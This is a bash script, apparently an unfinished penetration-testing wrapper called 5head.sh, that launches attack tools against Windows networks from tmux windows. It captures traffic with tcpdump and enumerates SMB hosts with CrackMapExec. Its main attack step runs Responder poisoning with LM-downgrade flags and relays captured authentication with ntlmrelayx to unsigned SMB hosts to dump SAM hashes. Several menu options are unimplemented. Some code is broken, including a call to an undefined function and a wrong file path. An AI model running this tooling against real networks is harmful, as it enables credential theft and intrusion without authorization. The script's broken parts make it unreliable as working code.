#!/bin/bash

print_usage() {
        printf '
        5head.sh usage: [-h] [-t targetfile] write this later

        mandatory arguments:
          -t TARGETFILE         Newline-delimmited list of targets. Accepts CIDRs or ranges (192.168.0.1-255)
          -i INTERFACE          Interface to use for network traffic

        useful arguments:
          -u USERNAME           Username to use for authentication
          -p PASSWORD           Password to use for authentication
          -d DOMAIN             Specific domain to perform authentication attempts on (NOT IMPLEMENTED YET)
          -s SAFE               Safe mode. Will not try to authenticate (YOU THOUGHT THIS WAS IMPLEMENTED?)

        optional arguments:
          -v VERBOSE            Print verbose output (THIS ISNT IMPLEMENTED EITHER)
          -h                    Print this helpmenu
';
}

if [[ $* == *-h ]]; then
        print_usage
        exit 1;
fi


### Argument helper
while getopts ":t:d:u:p:i:" o; do
    case "${o}" in
        t)
            targets=${OPTARG}
            ;;
        d)
            domain=${OPTARG}
            ;;
        u)
            username=${OPTARG}
            ;;
        p)
            password=${OPTARG}
            ;;
        i)
            interface=${OPTARG}
            ;;
        *)
            print_usage
            ;;
    esac
done
shift $((OPTIND-1))

## Debug

#echo $targets
#echo $domain
#echo $username
#echo $password
#echo $interface

### Tmux bootstrapping
if [ -z "${TMUX}" ]; then
        export session="5head"
        export targets=$targets
        export domain=$domain
        export username=$username
        export password=$password
        export interface=$interface
        export PROMPT="%F{9}5head.sh%f > "
        window=0
        tmux new-session -d -s $session ./5head.sh
        tmux rename-window -t $session:$window 'main'
        tmux attach-session -t $session
        exit 1;
fi

### Colors
green='\e[32m'
cyan='\e[96m'
red='\e[91m'
clear='\e[0m'

ColorGreen () {
        echo -ne $green$1$clear
}
ColorCyan () {
        echo -ne $cyan$1$clear
}
ColorRed () {
        echo -ne $red$1$clear
}

## Main part executing inside of tmux
function packet_cap() {
        echo -e '[*] Starting packet captured in "packet_cap" window...\n'
        tmux new-window -n "packet_cap"
        tmux send-keys -t 5head:packet_cap 'PROMPT="%F{9}5head.sh%f > "' C-m
        tmux send-keys -t 5head:packet_cap 'clear' C-m
	tmux send-keys -t 5head:packet_cap 'bash -c "stty -echo;clear;echo -e \"[*] Starting packet capture on ${interface}...\n[*] Output will be written to loot/packet_capture.pcap\";stty echo"' C-m
        tmux send-keys -t 5head:packet_cap 'tcpdump -i $interface -w loot/packet_capture.pcap' C-m
}

function cme_enum_smb() {
        echo -e '[*] Enumerating SMB targets with CrackMapExec...\n'
        tmux new-window -n "cme_enum"
        tmux send-keys -t 5head:cme_enum 'PROMPT="%F{9}5head.sh%f > "' C-m
        tmux send-keys -t 5head:cme_enum 'clear' C-m
        tmux send-keys -t 5head:cme_enum 'deps/cme smb $targets >> loot/cme_enum.txt' C-m
        tmux split-window -v -l 80%
	tmux send-keys -t 5head:cme_enum 'bash -c "stty -echo;clear;echo -e \"[*] Listing output from CrackMapExec...\n[*] Press enter in window above periodically...\";stty echo"' C-m
	tmux send-keys -t 5head:cme_enum 'tail -f loot/cme_enum.txt' C-m
}

function resp_ntlmrelay_1() {
	echo -e '[*] Setting up Responder + Ntlmrelayx.py (SAM dump)...\n'
	tmux new-window -n "relay"
	tmux send-keys -t 5head:relay 'PROMPT="%F{9}5head.sh%f > "' C-m
	tmux send-keys -t 5head:relay 'clear' C-m
	tmux send-keys -t 5head:relay 'python3 deps/Responder/Responder.py -I ${interface} --lm --disable-ess -w' C-m
	tmux split-window -h -l 50%
	tmux send-keys -t 5head:relay 'source deps/impacket-0.10.0/bin/activate' C-m
	grep -F -- "$domain" cme_enum.txt | grep 'signing:False' | cut -d " " -f 10 > loot/smb_targets.txt
	tmux send-keys -t 5head:relay 'ntlmrelayx.py -tf loot/smb_targets.txt -smb2support' C-m
}


function debug() {
	echo "exeucting sneaky"
	sneaky cme_enum "test"
}


## Main function area
printf '
    ____                                  __        __          __
   / __ \___  ____  ___  ____ _____ _____/ /__     / /   ____ _/ /_  _____
  / /_/ / _ \/ __ \/ _ \/ __ `/ __ `/ __  / _ \   / /   / __ `/ __ \/ ___/
 / _, _/  __/ / / /  __/ /_/ / /_/ / /_/ /  __/  / /___/ /_/ / /_/ (__  )
/_/ |_|\___/_/ /_/\___/\__, /\__,_/\__,_/\___/  /_____/\__,_/_.___/____/
                      /____/
'

echo "[*] Starting 5head.sh..."
if [ ! -d "./loot" ]; then
        mkdir loot
fi
touch ~/.hushlogin
PROMPT="%F{9}5head.sh%f > "

### Menu Stuff
menu(){
echo -ne "
~ 5head.sh ~
$(ColorGreen '1)') Enum
$(ColorGreen '2)') Poison
$(ColorGreen '3)') AD
$(ColorGreen '0)') Detach tmux
$(ColorCyan 'Choose a module:') "
        read a
        case $a in
                1) enum ;;
                2) poison ;;
		3) ad ;;
                0) tmux detach ;;
                ash) debug ; menu ;;
                *) echo "Invalid command entered"; menu ;;
        esac
}

enum(){
echo -ne "
~ 5head.sh -> enum ~
$(ColorGreen '1)') Packet capture + search for suspicious traffic
$(ColorGreen '2)') SMB enumeration + target generation (CME)
$(ColorGreen '3)') LDAP enumeration + target generation (CME)
$(ColorGreen '4)') MSSQL enumeration + target generation (CME)
$(ColorGreen '5)') Enumerate hosts for authentication coercion mechanisms $(ColorRed 'Creds required')
$(ColorGreen '6)') Check LDAP Signing and Channel Binding $(ColorRed 'Creds required')
$(ColorGreen '7)') Check Machine-Account-Quota $(ColorRed 'Creds required')
$(ColorGreen 'b)') Back to main menu...
$(ColorCyan 'Choose a function:') "
        read a
        case $a in
                1) packet_cap ; enum ;;
                2) cme_enum_smb ; enum ;;
                b) menu ;;
                *) echo "Invalid command entered"; enum ;;
        esac
}

poison(){
echo -ne "
~ 5head.sh -> poison ~
$(ColorGreen '1)') SMB: Responder + ntlmrelayx
$(ColorGreen '2)') SMB: Responder + ntlmrelayx
$(ColorGreen '3)') LDAP: Responder + ntlmrelayx
$(ColorGreen '4)') MSSQL: Responder + ntlmrelayx $(ColorRed 'NOT IMPLEMENTED')
$(ColorGreen '5)') MUTLI: Responder + ntlmrelayx $(ColorRed 'NOT IMPLEMENTED')
$(ColorGreen '7)') Check Machine-Account-Quota $(ColorRed 'Creds required')
$(ColorGreen 'b)') Back to main menu...
$(ColorCyan 'Choose a function:') "
        read b
        case $b in
                b) menu ;;
                *) echo "Invalid command entered"; poison ;;
        esac
}




menu

## To-do
# 1. Need a dependenacy checker startup thing
# 2. need env variable + variable safety checker exeter thing
# 3. Add checker to ensure 5head.sh is executed from base wd of repo
